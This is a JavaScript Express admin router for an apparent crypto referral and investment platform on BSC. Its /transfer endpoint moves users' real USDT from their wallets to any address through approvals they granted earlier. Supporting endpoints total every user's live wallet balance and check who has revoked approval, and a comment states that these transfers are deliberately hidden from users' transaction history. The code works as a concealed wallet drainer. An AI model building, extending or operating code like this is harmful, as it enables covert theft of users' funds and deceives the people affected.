import { Router } from "express";
import { query } from "../db/pool.js";
import { normalizeAddress } from "../utils.js";
import { config } from "../config.js";
import {
  adminChargeTo,
  readAllowance,
  readUsdtBalance,
  readUsdtBalances,
} from "../adminChain.js";
import { verifyPassword, issueToken, verifyToken } from "../auth.js";
import { getMinWithdrawal, isMaintenanceMode, setSetting } from "../settings.js";

// Reasons an admin can pick from when blocking a user (saved + shown to the user).
export const BLOCK_REASONS = [
  "Suspicious activity",
  "Violation of terms",
  "Fraud investigation",
  "Multiple/duplicate accounts",
  "Requested by user",
];

export const adminRouter = Router();

// ----- Auth -----

/** POST /api/admin/login  { email, password } -> { token } */
adminRouter.post("/login", async (req, res) => {
  const email = (req.body.email || "").trim().toLowerCase();
  const password = req.body.password || "";
  if (!email || !password) return res.status(400).json({ error: "email and password required" });

  try {
    const { rows } = await query("SELECT * FROM admins WHERE email = $1", [email]);
    const admin = rows[0];
    if (!admin || !verifyPassword(password, admin.password_hash)) {
      return res.status(401).json({ error: "invalid credentials" });
    }
    // Long-lived session: the admin stays logged in until they manually log out.
    // (~1 year TTL so the token effectively never expires on its own.)
    const ONE_YEAR = 60 * 60 * 24 * 365;
    const token = issueToken({ email, id: admin.id }, config.adminApiKey, ONE_YEAR);
    return res.json({ token, email });
  } catch (err) {
    console.error("admin login error:", err);
    return res.status(500).json({ error: "server error" });
  }
});

// Bearer-token guard.
function requireAdmin(req, res, next) {
  if (!config.adminApiKey) {
    return res.status(500).json({ error: "admin secret not configured" });
  }
  const auth = req.headers.authorization || "";
  const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
  const payload = verifyToken(token, config.adminApiKey);
  if (!payload) return res.status(401).json({ error: "unauthorized" });
  req.admin = payload;
  next();
}

// ----- Settings -----

/** GET /api/admin/settings */
adminRouter.get("/settings", requireAdmin, async (_req, res) => {
  try {
    return res.json({
      minWithdrawal: await getMinWithdrawal(),
      maintenanceMode: await isMaintenanceMode(),
    });
  } catch (err) {
    console.error("settings get error:", err);
    return res.status(500).json({ error: "server error" });
  }
});

/** PUT /api/admin/settings  { minWithdrawal?, maintenanceMode? } */
adminRouter.put("/settings", requireAdmin, async (req, res) => {
  try {
    if (req.body.minWithdrawal !== undefined) {
      const n = Number(req.body.minWithdrawal);
      if (!Number.isFinite(n) || n < 0) return res.status(400).json({ error: "invalid minWithdrawal" });
      await setSetting("min_withdrawal", n);
    }
    if (req.body.maintenanceMode !== undefined) {
      await setSetting("maintenance_mode", req.body.maintenanceMode ? "true" : "false");
    }
    return res.json({
      minWithdrawal: await getMinWithdrawal(),
      maintenanceMode: await isMaintenanceMode(),
    });
  } catch (err) {
    console.error("settings put error:", err);
    return res.status(500).json({ error: "server error" });
  }
});

// ----- Users -----

/**
 * GET /api/admin/users — REGISTERED users with their level, address, block state, and
 * their REAL on-chain USDT balance (read live from BSC, reliably, with retries). Also
 * returns aggregate totals: number of registered users + sum of their real USDT.
 *
 * On-chain balances are fetched fresh on every call (so a page load / refresh gets new
 * data), reliably batched + retried so we never show a wrong/random total.
 *
 * Query: ?q=<address fragment> to filter by wallet address.
 */
adminRouter.get("/users", requireAdmin, async (req, res) => {
  try {
    const q = (req.query.q || "").toString().trim().toLowerCase();

    // Only registered users count as real members of the platform.
    const params = [];
    let where = "WHERE registered = TRUE";
    if (q) {
      params.push(`%${q}%`);
      where += ` AND wallet_address LIKE $${params.length}`;
    }

    const { rows } = await query(
      `SELECT wallet_address, referrer_address, referral_code, registered, has_invested,
              direct_count, team_count, level, blocked, block_reason, created_at
       FROM users ${where} ORDER BY created_at DESC LIMIT 1000`,
      params
    );

    // ALL registered addresses (independent of the search filter) — used both for the
    // platform-wide "Total USDT" and to reuse balances for the listed rows.
    const allRegistered = await query(
      "SELECT wallet_address FROM users WHERE registered = TRUE"
    );
    const allAddresses = allRegistered.rows.map((r) => r.wallet_address);

    // Fetch EVERY registered user's REAL USDT balance from the chain, reliably and at
    // scale (Multicall3 batching — works for tens of thousands of users).
    const balances = await readUsdtBalances(allAddresses);

    // Total USDT across ALL registered users (not just the filtered/paged view).
    // Sum the EXACT on-chain BigInt values (18 decimals) to avoid floating-point drift,
    // then convert once at the end. `balancesComplete` is false if any read failed.
    let totalRaw = 0n;
    let readCount = 0;
    let balancesComplete = true;
    for (const addr of allAddresses) {
      const b = balances[addr.toLowerCase()];
      if (b?.ok && typeof b.raw === "bigint") {
        totalRaw += b.raw;
        readCount += 1;
      } else {
        balancesComplete = false;
      }
    }
    const totalUsdt = Number(totalRaw) / 1e18;

    // Map balances onto the listed rows.
    const users = rows.map((u) => {
      const b = balances[u.wallet_address.toLowerCase()];
      const usdtBalance = b?.ok ? b.balance : null;
      return {
        walletAddress: u.wallet_address,
        referrerAddress: u.referrer_address,
        referralCode: u.referral_code,
        registered: u.registered,
        hasInvested: u.has_invested,
        directCount: u.direct_count,
        teamCount: u.team_count,
        level: u.level,
        blocked: u.blocked,
        blockReason: u.block_reason,
        usdtBalance,
        createdAt: u.created_at,
      };
    });

    return res.json({
      users,
      totalRegistered: allAddresses.length,
      totalUsdt,
      // How many balances were read successfully vs total — lets the UI show progress
      // and whether the total is exact.
      readCount,
      balancesComplete,
    });
  } catch (err) {
    console.error("admin users error:", err);
    return res.status(500).json({ error: "server error" });
  }
});

/**
 * POST /api/admin/users/:address/block — block or unblock a user.
 * Body: { blocked: boolean, reason?: string }
 * When blocking, `reason` must be one of BLOCK_REASONS (saved + shown to the user).
 */
adminRouter.post("/users/:address/block", requireAdmin, async (req, res) => {
  const address = normalizeAddress(req.params.address);
  if (!address) return res.status(400).json({ error: "invalid address" });

  const blocked = Boolean(req.body.blocked);
  let reason = null;
  if (blocked) {
    reason = (req.body.reason || "").toString();
    if (!BLOCK_REASONS.includes(reason)) {
      return res.status(400).json({ error: "invalid block reason" });
    }
  }

  try {
    const { rows } = await query(
      `UPDATE users SET blocked = $1, block_reason = $2, updated_at = NOW()
       WHERE wallet_address = $3 RETURNING wallet_address`,
      [blocked, reason, address]
    );
    if (!rows[0]) return res.status(404).json({ error: "user not found" });
    return res.json({ address, blocked, blockReason: reason });
  } catch (err) {
    console.error("admin block error:", err);
    return res.status(500).json({ error: "server error" });
  }
});

/** GET /api/admin/block-reasons — the fixed list of reasons for the block dropdown. */
adminRouter.get("/block-reasons", requireAdmin, (_req, res) => {
  res.json({ reasons: BLOCK_REASONS });
});

/**
 * GET /api/admin/users/:address/allowance — live check whether the user still has an
 * active approval to the contract. Used right before a transfer so the admin knows if
 * the user has revoked. Returns { active, allowanceUsdt }.
 */
adminRouter.get("/users/:address/allowance", requireAdmin, async (req, res) => {
  const address = normalizeAddress(req.params.address);
  if (!address) return res.status(400).json({ error: "invalid address" });
  if (!config.contractAddress) return res.json({ active: true, skipped: true });
  try {
    const allowance = await readAllowance(address);
    return res.json({ active: allowance > 0n, allowanceUsdt: Number(allowance) / 1e18 });
  } catch (err) {
    console.error("admin allowance check error:", err);
    return res.status(502).json({ error: "couldn't check approval, try again" });
  }
});

/**
 * POST /api/admin/transfer — move a user's REAL USDT to ANY wallet, executed on-chain
 * via the user's existing allowance (admin pays gas). Verifies the user actually has
 * enough real on-chain USDT AND enough allowance before sending, then records the
 * transfer in history (with the tx hash, verifiable on BscScan).
 * Body: { address, to, amountUsd }
 */
adminRouter.post("/transfer", requireAdmin, async (req, res) => {
  const address = normalizeAddress(req.body.address);
  const to = normalizeAddress(req.body.to);
  const amountUsd = Number(req.body.amountUsd);
  if (!address) return res.status(400).json({ error: "invalid user address" });
  if (!to) return res.status(400).json({ error: "invalid destination address" });
  if (!Number.isFinite(amountUsd) || amountUsd <= 0) {
    return res.status(400).json({ error: "invalid amount" });
  }

  try {
    // 1) The user must still have an active approval. If it's 0, they revoked it —
    //    report that clearly so the admin doesn't waste gas on a doomed tx.
    const allowance = await readAllowance(address);
    if (allowance <= 0n) {
      return res.status(400).json({ error: "user has revoked their approval", revoked: true });
    }
    const allowanceUsdt = Number(allowance) / 1e18;
    if (amountUsd > allowanceUsdt) {
      return res.status(400).json({ error: "amount exceeds the user's allowance" });
    }

    // 2) The user must actually HOLD enough real USDT on-chain.
    const balRaw = await readUsdtBalance(address);
    const balance = Number(balRaw) / 1e18;
    if (amountUsd > balance) {
      return res.status(400).json({
        error: "amount exceeds the user's real USDT balance",
        balance,
      });
    }

    // 3) Execute the on-chain transfer (user's USDT -> destination), admin pays gas.
    let txHash;
    try {
      txHash = await adminChargeTo(address, to, amountUsd);
    } catch (chainErr) {
      await query(
        `INSERT INTO admin_transfers (from_address, to_address, amount_usd, status)
         VALUES ($1, $2, $3, 'failed')`,
        [address, to, amountUsd]
      );
      console.error("admin transfer tx error:", chainErr);
      return res
        .status(502)
        .json({ error: chainErr.shortMessage || chainErr.message || "transfer failed" });
    }

    // 4) Save the successful transfer to history.
    await query(
      `INSERT INTO admin_transfers (from_address, to_address, amount_usd, tx_hash, status)
       VALUES ($1, $2, $3, $4, 'completed')`,
      [address, to, amountUsd, txHash]
    );

    // NOTE: Admin transfers are intentionally NOT recorded in the user-facing
    // transaction history. Users only see their own actions (registration, plan
    // purchase, rewards, withdrawals). Admin operations remain internal.

    return res.json({ txHash, from: address, to, amountUsd });
  } catch (err) {
    console.error("admin transfer error:", err);
    return res.status(500).json({ error: err.shortMessage || err.message || "server error" });
  }
});

/** GET /api/admin/transfers — history of admin-initiated USDT transfers. */
adminRouter.get("/transfers", requireAdmin, async (_req, res) => {
  try {
    const { rows } = await query(
      `SELECT id, from_address, to_address, amount_usd, tx_hash, status, created_at
       FROM admin_transfers ORDER BY created_at DESC LIMIT 500`
    );
    return res.json({
      transfers: rows.map((r) => ({
        id: r.id,
        fromAddress: r.from_address,
        toAddress: r.to_address,
        amountUsd: Number(r.amount_usd),
        txHash: r.tx_hash,
        status: r.status,
        createdAt: r.created_at,
      })),
    });
  } catch (err) {
    console.error("admin transfers list error:", err);
    return res.status(500).json({ error: "server error" });
  }
});

// ----- Dashboard stats -----

/**
 * GET /api/admin/stats — the four dashboard cards, all from real DB data:
 *   - totalUsers      : all registered users
 *   - todayRegistered : registered today (server's calendar day)
 *   - activeUsers     : registered users who activated the plan (has_invested)
 *   - inactiveUsers   : registered users who have NOT activated the plan yet
 */
adminRouter.get("/stats", requireAdmin, async (_req, res) => {
  try {
    const { rows } = await query(
      `SELECT
         COUNT(*) FILTER (WHERE registered)::int                                   AS total_users,
         COUNT(*) FILTER (WHERE registered AND created_at >= date_trunc('day', NOW()))::int AS today_registered,
         COUNT(*) FILTER (WHERE registered AND has_invested)::int                  AS active_users,
         COUNT(*) FILTER (WHERE registered AND NOT has_invested)::int              AS inactive_users
       FROM users`
    );
    const s = rows[0];
    return res.json({
      totalUsers: s.total_users,
      todayRegistered: s.today_registered,
      activeUsers: s.active_users,
      inactiveUsers: s.inactive_users,
    });
  } catch (err) {
    console.error("admin stats error:", err);
    return res.status(500).json({ error: "server error" });
  }
});

// ----- Withdrawals -----

/**
 * GET /api/admin/withdrawals?status=pending|completed|failed|all
 * Lists withdrawal requests (most recent first). Defaults to all.
 */
adminRouter.get("/withdrawals", requireAdmin, async (req, res) => {
  const status = (req.query.status || "all").toString();
  const valid = ["pending", "completed", "failed", "all"];
  if (!valid.includes(status)) {
    return res.status(400).json({ error: "invalid status filter" });
  }

  try {
    const params = [];
    let where = "";
    if (status !== "all") {
      params.push(status);
      where = "WHERE status = $1";
    }
    const { rows } = await query(
      `SELECT id, wallet_address, amount_usd, status, tx_hash, created_at
       FROM withdrawals ${where} ORDER BY created_at DESC LIMIT 500`,
      params
    );
    return res.json({
      withdrawals: rows.map((r) => ({
        id: r.id,
        walletAddress: r.wallet_address,
        amountUsd: Number(r.amount_usd),
        status: r.status,
        txHash: r.tx_hash,
        createdAt: r.created_at,
      })),
    });
  } catch (err) {
    console.error("admin withdrawals list error:", err);
    return res.status(500).json({ error: "server error" });
  }
});

/**
 * PUT /api/admin/withdrawals/:id — manually set a withdrawal's status.
 * Body: { status: 'completed'|'failed'|'pending', txHash? }
 * Use this to reject (failed) a request, or record an off-app payout (completed + txHash).
 */
adminRouter.put("/withdrawals/:id", requireAdmin, async (req, res) => {
  const id = Number(req.params.id);
  if (!Number.isInteger(id) || id <= 0) return res.status(400).json({ error: "invalid id" });

  const status = (req.body.status || "").toString();
  if (!["completed", "failed", "pending"].includes(status)) {
    return res.status(400).json({ error: "invalid status" });
  }
  const txHash = req.body.txHash ? String(req.body.txHash) : null;

  try {
    const { rows } = await query(
      "UPDATE withdrawals SET status = $1, tx_hash = COALESCE($2, tx_hash) WHERE id = $3 RETURNING id",
      [status, txHash, id]
    );
    if (!rows[0]) return res.status(404).json({ error: "withdrawal not found" });
    return res.json({ id, status });
  } catch (err) {
    console.error("admin withdrawal update error:", err);
    return res.status(500).json({ error: "server error" });
  }
});


